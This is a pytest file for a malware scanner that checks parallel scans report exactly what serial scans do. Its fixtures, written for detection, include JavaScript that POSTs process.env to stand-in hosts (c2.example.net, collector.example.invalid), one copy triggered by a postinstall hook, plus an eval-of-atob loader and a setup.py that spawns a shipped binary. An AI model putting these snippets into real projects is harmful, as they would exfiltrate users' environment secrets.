"""Parallel execution.

The property that matters is not speed, it is that parallelism changes nothing
observable. A scan run across sixteen workers must produce exactly what a serial
scan produced, in the same order, or every downstream guarantee -- baselines,
caching, reproducible gates -- is void.

Speed is tested separately and loosely, because a timing assertion on shared CI
hardware is a flaky test rather than a useful one.
"""

from __future__ import annotations

import os

import pytest

from cordon_scanner import Scanner
from cordon_scanner.engine.parallel import (
    MAX_WORKERS,
    MIN_FILES_FOR_PARALLEL,
    ParallelScanner,
)
from cordon_scanner.foundation.config.settings import Config


class ParallelFixtures:
    """Fixtures for the tests in test_parallel.py; every test class here inherits them."""

    @pytest.fixture
    def repository(self, tmp_path):
        """A tree large enough to cross the parallel threshold, and to be batched."""
        root = tmp_path / "repo"
        root.mkdir()
        for i in range(FIXTURE_FILES):
            (root / f"mod{i:04d}.js").write_text(
                f"export const value{i} = {i};\nexport function f{i}(a) {{ return a + {i}; }}\n",
                encoding="utf-8",
            )
        # A handful of real findings, so the comparison is not between two empty
        # results.
        (root / "loader.js").write_text("const p = atob(BLOB);\neval(p);\n", encoding="utf-8")
        (root / "telemetry.js").write_text(
            "const { execSync } = require('child_process');\n"
            "const e = JSON.stringify(process.env);\n"
            "fetch('https://c2.example.net/i', {method:'POST', body:e});\n"
            "execSync('true');\n",
            encoding="utf-8",
        )

        # And one finding that exists ONLY because of the scan context, which is the
        # case the equivalence tests above could not see.
        #
        # Every finding in this fixture used to stand on the contents of its own file.
        # Those cross the process boundary intact, so the comparison passed while an
        # entire class of detection was missing in parallel: `ctx.in_install_hook` is a
        # precondition on the composites, the worker rebuilt the context from the
        # inventory alone, and the inventory knows `package.json` declares a
        # `postinstall` without knowing it runs `scripts/setup.js`. Same files, same
        # count, same rules -- and MALWARE.EXFIL.001 at critical with one worker and
        # nothing at all with eight.
        (root / "package.json").write_text(
            '{"name":"fixture","version":"1.0.0","scripts":{"postinstall":"node scripts/setup.js"}}\n',
            encoding="utf-8",
        )
        (root / "scripts").mkdir()
        (root / "scripts" / "setup.js").write_text(
            "const https = require('https');\n"
            "const body = JSON.stringify(process.env);\n"
            "https.request({host:'collector.example.invalid',method:'POST'},()=>{}).end(body);\n",
            encoding="utf-8",
        )
        return root


class TestWorkerCount(ParallelFixtures):
    def test_small_scans_stay_serial(self) -> None:
        """Pool startup is tens of milliseconds per worker, which is most of the
        runtime on a few hundred files. A pre-commit hook must not pay it."""
        assert ParallelScanner.worker_count(8, file_count=10) == 1
        assert ParallelScanner.worker_count(0, file_count=MIN_FILES_FOR_PARALLEL - 1) == 1

    def test_explicit_single_worker_is_honoured(self) -> None:
        assert ParallelScanner.worker_count(1, file_count=100_000) == 1

    def test_large_scans_use_workers(self) -> None:
        assert ParallelScanner.worker_count(4, file_count=100_000) == 4

    def test_worker_count_is_capped(self) -> None:
        """A high-core runner spawning one worker per core over a medium
        repository spends more time starting processes than matching bytes."""
        assert ParallelScanner.worker_count(512, file_count=100_000) == MAX_WORKERS

    def test_auto_resolves_to_something_sane(self) -> None:
        count = ParallelScanner.worker_count(0, file_count=100_000)
        assert 1 <= count <= MAX_WORKERS


class TestBatching(ParallelFixtures):
    def test_batches_are_balanced_by_bytes(self) -> None:
        """One large file and a thousand small ones are not the same work.
        Sizing by count leaves a worker holding the large file while the others
        idle, which is the usual reason a parallel scan is barely faster."""
        items = [(i, f"f{i}", 1000) for i in range(10)]
        batches = ParallelScanner.batch_by_bytes(items, target=3000)
        assert len(batches) > 1
        for batch in batches:
            assert sum(size for _, _, size in batch) <= 4000

    def test_a_huge_file_gets_its_own_batch(self) -> None:
        items = [(0, "small", 10), (1, "huge", 50_000_000), (2, "small2", 10)]
        batches = ParallelScanner.batch_by_bytes(items, target=1000)
        huge = [b for b in batches if any(name == "huge" for _, name, _ in b)]
        assert len(huge) == 1
        assert len(huge[0]) == 1

    def test_every_item_appears_exactly_once(self) -> None:
        """A batching bug that drops a file is a silent false negative across
        that file, which nothing downstream can detect."""
        items = [(i, f"f{i}", i * 137 % 9000) for i in range(500)]
        batches = ParallelScanner.batch_by_bytes(items, target=10_000)
        flat = [item for batch in batches for item in batch]
        assert sorted(flat) == sorted(items)

    def test_empty_input(self) -> None:
        assert ParallelScanner.batch_by_bytes([]) == []


#: Files in the fixture. Sized so `worker_count` actually returns more than one.
#:
#: `MIN_FILES_FOR_PARALLEL` is necessary and was not sufficient, and the gap made
#: every test in this module vacuous. `worker_count` also caps workers at the
#: number of BATCHES, and a batch holds four megabytes at an assumed eight
#: kilobytes per file -- so four hundred and sixty files are one batch, one batch
#: is one worker, and the suite asserting that parallel matches serial was
#: comparing a serial scan to another serial scan. It would have passed with the
#: pool removed entirely.
#:
#: A little over a thousand files is the smallest tree that crosses into two
#: batches. `test_the_fixture_actually_parallelises` asserts it, so this cannot
#: quietly go back to proving nothing if either constant moves.
FIXTURE_FILES = 1_100


class ParallelHelpers:
    """Helpers for test_parallel.py."""

    @staticmethod
    def scan_with(repository, workers: int):
        cfg = Config.default().with_overrides(
            use_cache=False, limits=Config.default().limits.merged(max_workers=workers)
        )
        return Scanner(cfg).scan(repository)


@pytest.mark.slow
class TestParallelEquivalence(ParallelFixtures):
    def test_the_fixture_actually_parallelises(self) -> None:
        """The guard under every test in this class.

        Each of them compares a scan at one worker with a scan at four, and each
        was comparing two serial scans: the fixture was four hundred and sixty
        files, `worker_count` caps workers at the batch count, and four hundred and
        sixty files at the assumed eight kilobytes each is one four-megabyte batch.
        The class would have passed with the process pool deleted.
        """
        assert ParallelScanner.worker_count(4, file_count=FIXTURE_FILES) > 1
        assert FIXTURE_FILES > MIN_FILES_FOR_PARALLEL

    def test_parallel_matches_serial_exactly(self, repository, tmp_path) -> None:
        """The guarantee. Parallelism must change nothing observable."""
        serial_cfg = Config.default().with_overrides(
            use_cache=False, limits=Config.default().limits.merged(max_workers=1)
        )
        parallel_cfg = Config.default().with_overrides(
            use_cache=False, limits=Config.default().limits.merged(max_workers=4)
        )

        serial = Scanner(serial_cfg).scan(repository)
        parallel = Scanner(parallel_cfg).scan(repository)

        assert [f.to_dict() for f in serial.findings] == [f.to_dict() for f in parallel.findings]

    def test_order_is_stable_across_worker_counts(self, repository) -> None:
        """Completion order depends on scheduling. Output order must not."""
        results = []
        for workers in (1, 2, 4):
            cfg = Config.default().with_overrides(
                use_cache=False,
                limits=Config.default().limits.merged(max_workers=workers),
            )
            results.append([f.fingerprint for f in Scanner(cfg).scan(repository).findings])

        assert results[0] == results[1] == results[2]

    def test_files_scanned_count_agrees(self, repository) -> None:
        """A batching or scheduling bug that drops files would show here before
        it showed anywhere else."""
        counts = []
        for workers in (1, 4):
            cfg = Config.default().with_overrides(
                use_cache=False,
                limits=Config.default().limits.merged(max_workers=workers),
            )
            counts.append(Scanner(cfg).scan(repository).stats.files_scanned)
        assert counts[0] == counts[1]


@pytest.mark.slow
class TestTheContextReachesTheWorkers(ParallelFixtures):
    """A worker rebuilt the scan context from the inventory and lost half of it.

    `engine._context(inventory)` can say that a manifest DECLARES an install hook.
    It cannot say which file the hook runs, because `inventory.hooks` records the
    manifest's path: `package.json`, not `scripts/setup.js`. The parent resolves
    that afterwards, then follows the script's imports, and none of it was sent to
    the pool.

    What that cost was not a lower risk score. `ctx.in_install_hook` gates the
    composites, so an install script that posts the environment out produced a
    critical MALWARE.EXFIL.001 at one worker and NOTHING at eight -- a silent
    false negative on the exact attack this tool exists to catch, in the default
    configuration, because parallelism engages above four hundred files and the
    worker count defaults to the machine's core count.

    The equivalence tests above ran for months without seeing it: every finding in
    the fixture stood on the contents of one file, and file contents cross a
    process boundary intact. Only a context-dependent finding can catch this, so
    the fixture now has one.
    """

    RULE = "MALWARE.EXFIL.001"

    def test_the_install_time_finding_survives_the_pool(self, repository) -> None:
        parallel = ParallelHelpers.scan_with(repository, 8)
        hit = [
            f
            for f in parallel.findings
            if f.rule_id == self.RULE and f.location.path.endswith("scripts/setup.js")
        ]
        assert hit, (
            "the install-hook payload was not reported in parallel; "
            f"got {sorted({f.rule_id for f in parallel.findings})}"
        )

    def test_and_is_reported_identically_serially(self, repository) -> None:
        """The assertion that makes the one above mean something: if the fixture
        stopped producing this finding at all, that test would pass by vacuum."""
        serial = ParallelHelpers.scan_with(repository, 1)
        assert [f.fingerprint for f in serial.findings if f.rule_id == self.RULE] == [
            f.fingerprint
            for f in ParallelHelpers.scan_with(repository, 8).findings
            if f.rule_id == self.RULE
        ]

    def test_the_install_time_risk_factor_is_applied_either_way(self, repository) -> None:
        """The score, not just the finding. A composite that fires but is scored
        as an ordinary file still misranks against everything else in the report."""
        factors = {}
        for workers in (1, 8):
            hit = next(
                f
                for f in ParallelHelpers.scan_with(repository, workers).findings
                if f.rule_id == self.RULE and f.location.path.endswith("scripts/setup.js")
            )
            factors[workers] = {factor.name for factor in hit.risk.factors}
        assert "install_time" in factors[1]
        assert factors[1] == factors[8]

    def test_the_worker_keeps_what_only_the_inventory_knows(self) -> None:
        """The hook paths are unioned into the worker's context, not assigned over
        it. The inventory contributes git hooks and the manifests themselves, which
        the parent does not recompute, so overwriting would trade one set of
        missing paths for another."""
        from dataclasses import replace

        from cordon_scanner.detect.base import ScanContext

        base = ScanContext(
            config=Config.default(),
            rules=Scanner(Config.default()).rules,
            install_hook_paths=frozenset({".git/hooks/pre-commit", "package.json"}),
        )
        merged = replace(
            base, install_hook_paths=base.install_hook_paths | frozenset({"scripts/setup.js"})
        )
        assert merged.in_install_hook(".git/hooks/pre-commit")
        assert merged.in_install_hook("scripts/setup.js")


class TestCompletionOrder(ParallelFixtures):
    """Batches are consumed as they finish, not in submission order.

    Waiting on futures in order means one slow batch holds back every batch
    behind it that has already finished, so a progress count stalls and then
    leaps -- which is the appearance of a hang that reporting progress exists to
    remove. Consuming them as they complete fixes that and makes collection
    order depend on scheduling, so these tests pin the property that makes it
    safe: nothing downstream may depend on that order.
    """

    def test_reversed_collection_produces_identical_output(self, repository, monkeypatch) -> None:
        """The guarantee stated directly. Every result carries its own index,
        and `ScanResult.sorted` orders by severity, risk, path, line, rule and
        fingerprint -- never by completion."""
        from cordon_scanner.engine.parallel import ParallelScanner

        config = Config.default().with_overrides(
            use_cache=False, limits=Config.default().limits.merged(max_workers=4)
        )
        forward = Scanner(config).scan(repository)

        original = ParallelScanner.run

        def reversed_run(**kwargs):
            produced = original(**kwargs)
            return None if produced is None else list(reversed(produced))

        monkeypatch.setattr(ParallelScanner, "run", staticmethod(reversed_run))
        backward = Scanner(config).scan(repository)

        assert [f.to_dict() for f in forward.findings] == [f.to_dict() for f in backward.findings]
        assert forward.findings, "no findings, so this comparison proves nothing"

    def test_progress_is_reported_while_the_pool_runs(self, repository) -> None:
        """Not after it returns. Advancing only once every result was in made a
        parallel scan sit at 0 for its whole duration and then jump to
        complete."""
        seen: list[str] = []

        class Watcher:
            def phase(self, name: str, total: int | None = None) -> None:
                return None

            def advance(self, path: str = "") -> None:
                seen.append(path)

            def note(self, message: str) -> None:
                return None

            def finish(self) -> None:
                return None

        config = Config.default().with_overrides(
            use_cache=False, limits=Config.default().limits.merged(max_workers=4)
        )
        result = Scanner(config, progress=Watcher()).scan(repository)
        scanned = {f.location.path for f in result.findings if f.location}
        assert seen, "no file was ever reported"
        assert scanned <= set(seen) | {"."}, "a scanned file was never reported as progress"


class TestTheEstimateCountsBytes:
    """E2: 450 large files ran on one worker because the estimate assumed 8 KB each."""

    def test_large_files_below_the_count_threshold_are_parallelised(self) -> None:
        assert ParallelScanner.worker_count(4, file_count=450, total_bytes=450 * 300 * 1024) == 4

    def test_many_tiny_files_keep_the_count_estimate(self) -> None:
        assert ParallelScanner.worker_count(4, file_count=100_000, total_bytes=100_000) == 4

    def test_a_handful_of_huge_files_never_gets_more_workers_than_files(self) -> None:
        assert ParallelScanner.worker_count(8, file_count=3, total_bytes=3 << 30) == 3

    def test_small_work_stays_serial(self) -> None:
        assert ParallelScanner.worker_count(8, file_count=10, total_bytes=10 * 1024) == 1


class TestEverySettingReachesTheWorkers:
    """E3: the ClamAV defect was one setting missing from the worker payload, and `judge_blocks`,
    `judge_max_calls`, `allowed_action_owners` and `internal_namespaces` were the next four. Every
    `Config` field must survive the trip a worker's configuration takes, or be declared parent-only
    with a reason, so the next one cannot be added silently."""

    @staticmethod
    def _non_default(config):
        import dataclasses

        return dataclasses.replace(
            config,
            judge_blocks=True,
            judge_max_calls=5,
            allowed_action_owners=("acme",),
            internal_namespaces=("@acme",),
            judge="model-x",
            clamav="tcp://127.0.0.1:3310",
            rule_file="/rules.yar",
            max_intel_age=7,
            reachability=True,
            allow_plugins=True,
            profile="strict",
            expand_archives=False,
            intel_feed=False,
            offline=False,
            disabled_rules=frozenset({"X.Y.001"}),
            exclude=("vendor/**",),
            include=("src/**",),
        )

    def test_the_round_trip(self) -> None:
        import dataclasses

        from cordon_scanner.engine.parallel import CARRIED_SETTINGS, PARENT_ONLY_SETTINGS
        from cordon_scanner.foundation.config.settings import Config

        original = self._non_default(Config.default())
        rebuilt = Config.from_dict(original.to_dict(), source="<worker>")
        rebuilt = dataclasses.replace(
            rebuilt, **{key: getattr(original, key) for key in CARRIED_SETTINGS}
        )
        lost = {
            f.name
            for f in dataclasses.fields(Config)
            if getattr(original, f.name) != getattr(rebuilt, f.name)
        }
        assert lost <= set(PARENT_ONLY_SETTINGS), (
            f"settings a worker never sees: {sorted(lost - set(PARENT_ONLY_SETTINGS))}"
        )

    def test_every_field_is_accounted_for(self) -> None:
        """A field neither carried, nor in the schema, nor declared parent-only fails here."""
        import dataclasses

        from cordon_scanner.engine.parallel import CARRIED_SETTINGS, PARENT_ONLY_SETTINGS
        from cordon_scanner.foundation.config.settings import Config

        schema = repr(Config.default().to_dict())
        renamed = {
            "rule_packs": "packs",
            "extra_rule_paths": "extra",
            "disabled_rules": "disabled",
            "severity_threshold": "severity_threshold",
            "policy": "policy",
            "version": "version",
        }
        unaccounted = [
            f.name
            for f in dataclasses.fields(Config)
            if f.name not in CARRIED_SETTINGS
            and f.name not in PARENT_ONLY_SETTINGS
            and f"'{renamed.get(f.name, f.name)}'" not in schema
        ]
        assert not unaccounted, f"decide where these go: {unaccounted}"


class TestAvailableCpus:
    """An automatic pool is sized to the cores the process may use, not the host's."""

    @staticmethod
    def cgroup(tmp_path, cpu_max: str | None = None, v1: tuple[int, int] | None = None) -> str:
        if cpu_max is not None:
            (tmp_path / "cpu.max").write_text(cpu_max + "\n", encoding="ascii")
        if v1 is not None:
            (tmp_path / "cpu").mkdir()
            (tmp_path / "cpu" / "cpu.cfs_quota_us").write_text(f"{v1[0]}\n", encoding="ascii")
            (tmp_path / "cpu" / "cpu.cfs_period_us").write_text(f"{v1[1]}\n", encoding="ascii")
        return str(tmp_path)

    def test_a_container_quota_of_two_cpus_is_two(self, tmp_path) -> None:
        assert ParallelScanner.available_cpus(self.cgroup(tmp_path, "200000 100000")) <= 2

    def test_a_fractional_quota_rounds_up(self, tmp_path) -> None:
        assert ParallelScanner.available_cpus(self.cgroup(tmp_path, "150000 100000")) <= 2

    def test_no_quota_is_the_affinity_mask(self, tmp_path) -> None:
        expected = (
            len(os.sched_getaffinity(0)) if hasattr(os, "sched_getaffinity") else os.cpu_count()
        )
        assert ParallelScanner.available_cpus(self.cgroup(tmp_path, "max 100000")) == expected

    def test_a_cgroup_v1_quota(self, tmp_path) -> None:
        assert ParallelScanner.available_cpus(self.cgroup(tmp_path, v1=(100000, 100000))) == 1

    def test_unreadable_cgroup_files_fall_back(self, tmp_path) -> None:
        assert ParallelScanner.available_cpus(self.cgroup(tmp_path, "garbage")) >= 1


class TestThePoolStopsAtTheDeadline(ParallelFixtures):
    """What the pool does at the scan's deadline, tested without a clock: each deadline here is
    already past, so the outcome cannot depend on how loaded the machine is."""

    @staticmethod
    def items(*indices: int) -> list[tuple[int, str, int, str, None]]:
        return [(index, f"m{index}.js", 10, "", None) for index in indices]

    def test_a_worker_past_the_deadline_reads_nothing(self, monkeypatch) -> None:
        from types import SimpleNamespace

        # A worker state nothing is read from: past the deadline no file is loaded or inspected.
        monkeypatch.setattr(
            ParallelScanner, "_worker", SimpleNamespace(engine=None, context=None, detectors=())
        )
        out = ParallelScanner._inspect_batch(self.items(3, 4), "/nonexistent", deadline=0.0)
        assert out == [(3, [], None, False), (4, [], None, False)]

    def test_batches_not_started_are_cancelled_and_listed(self) -> None:
        from concurrent.futures import Future

        finished: Future = Future()
        finished.set_result(
            [(0, [], True, True), (1, [], None, False)]
        )  # 1 was reached after the deadline
        never_started: Future = Future()
        collected: list = []
        unstarted: list[int] = []
        ParallelScanner._collect_until(
            {finished: self.items(0, 1), never_started: self.items(2, 3)},
            collected,
            None,
            0.0,
            unstarted,
        )
        assert [index for index, _findings, _trusted, _cacheable in collected] == [0]
        assert sorted(unstarted) == [1, 2, 3]
        assert never_started.cancelled()

    def test_the_scan_reports_what_the_pool_left_unexamined(self, repository, monkeypatch) -> None:
        def run(**kwargs):
            kwargs["unstarted"].extend(item[0] for item in kwargs["files"])
            return []

        monkeypatch.setattr(ParallelScanner, "run", staticmethod(run))
        config = Config.default().with_overrides(
            use_cache=False,
            limits=Config.default().limits.merged(total_timeout=900.0, max_workers=4),
        )
        result = Scanner(config).scan(repository)
        messages = [
            f.message
            for f in result.findings
            if f.rule_id == "OPERATIONAL.SCAN.TIMEOUT" and "still unexamined" in f.message
        ]
        assert messages, [f.message for f in result.findings]
        assert not result.complete, "a scan with unexamined files reported complete"


class TestTheWorkerHasTheWholeContext:
    """A worker judges a file with everything the parent's context knows (`ScanContext.facts`).

    It was sent a list of facts instead, each added when its absence was noticed, and the five
    set after the list was last extended never arrived. The cost was not a lower score: a
    `setup.py` that spawns the binary its package ships was MALWARE.INSTALL.CONSUMER_CODE.001 at
    critical with one worker and nothing with eight, so a scan with the default worker count of
    any source distribution over four megabytes passed it.
    """

    SETUP = (
        "import os, subprocess\n"
        "from setuptools import setup\n"
        "from setuptools.command.install import install\n\n\n"
        "class Post(install):\n"
        "    def run(self):\n"
        "        install.run(self)\n"
        "        subprocess.Popen([os.path.join(os.path.dirname(__file__), 'dist', 'pip_security')])\n\n\n"
        "setup(name='probe', version='1.0', cmdclass={'install': Post})\n"
    )

    @staticmethod
    def sdist(path, setup: str) -> None:
        """An sdist whose `setup.py` spawns a shipped native binary, padded with plain data past
        the size at which members are scanned across a pool."""
        import io
        import tarfile

        def add(archive, name: str, data: bytes, mode: int = 0o644) -> None:
            member = tarfile.TarInfo(f"probe-1.0/{name}")
            member.size, member.mode = len(data), mode
            archive.addfile(member, io.BytesIO(data))

        with tarfile.open(path, "w:gz") as archive:
            add(archive, "PKG-INFO", b"Metadata-Version: 2.1\nName: probe\nVersion: 1.0\n")
            add(archive, "setup.py", setup.encode())
            add(archive, "dist/pip_security", b"\x7fELF\x02\x01\x01" + bytes(64), 0o755)
            for i in range(4):
                rows = "".join(f"{j},{j * 3}\n" for j in range(120_000))
                add(archive, f"data/table{i}.csv", f"id,value\n{rows}".encode())

    def test_a_shipped_binary_spawned_at_install_blocks_at_any_worker_count(self, tmp_path) -> None:
        target = tmp_path / "probe-1.0.tar.gz"
        self.sdist(target, self.SETUP)
        found = {}
        for workers in (1, 8):
            config = Config.default().with_overrides(
                use_cache=False, limits=Config.default().limits.merged(max_workers=workers)
            )
            found[workers] = sorted(
                f.rule_id
                for f in Scanner(config).scan(target).findings
                if f.location.path.endswith("setup.py")
            )
        assert "MALWARE.INSTALL.CONSUMER_CODE.001" in found[1]
        assert found[8] == found[1]

    def test_the_pool_is_sent_every_fact_of_the_context(self, monkeypatch, tmp_path) -> None:
        """Every field but the process-local ones, so a field added later reaches the workers
        without anyone remembering to send it."""
        from dataclasses import fields

        from cordon_scanner.detect.base import ScanContext

        target = tmp_path / "probe-1.0.tar.gz"
        self.sdist(target, self.SETUP)
        sent: list[set[str]] = []
        run = ParallelScanner.run

        def recording(**kwargs):
            sent.append(set(kwargs["facts"]))
            return run(**kwargs)

        monkeypatch.setattr(ParallelScanner, "run", staticmethod(recording))
        config = Config.default().with_overrides(
            use_cache=False, limits=Config.default().limits.merged(max_workers=8)
        )
        Scanner(config).scan(target)
        assert sent, "the probe must cross the parallel threshold"
        assert sent[0] == {f.name for f in fields(ScanContext)} - set(ScanContext.LOCAL)

    def test_every_local_field_is_a_field_and_says_why(self) -> None:
        from dataclasses import fields

        from cordon_scanner.detect.base import ScanContext

        assert set(ScanContext.LOCAL) <= {f.name for f in fields(ScanContext)}
        assert all(reason.strip() for reason in ScanContext.LOCAL.values())
